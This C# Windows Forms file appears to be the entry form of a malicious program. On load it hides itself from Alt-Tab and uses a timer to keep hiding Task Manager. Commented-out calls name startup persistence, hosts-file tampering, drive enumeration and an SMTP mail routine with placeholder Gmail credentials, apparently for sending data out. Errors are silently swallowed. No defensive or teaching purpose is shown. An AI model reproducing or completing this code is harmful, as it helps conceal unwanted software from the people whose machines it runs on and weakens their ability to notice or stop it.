using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using xNet;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Mail;


namespace WindowsFormsApplication6
{
    public partial class Form1 : Form
    {

        functions User = new functions();

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {            
            try
            {
                //User.setAutoRun();
            }
            catch{ }
            try
            {
               User.HideFromAltTab(this.Handle);
            }
            catch { }
            try
            {
                //User.addUser("smtp.gmail.com","Email@gmail.com","Password","Email@gmail.com");
            }
            catch { }
            try
            {
               timer1.Enabled = true;
            }
            catch { }
            try
            {
               //User.modifyHosts();
            }
            catch { }
            try
            {
                //User.getDrives();
            }
            catch { }
            //this.Close();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                User.HideTaskMgr();
            }
            catch { }
        }
    }
}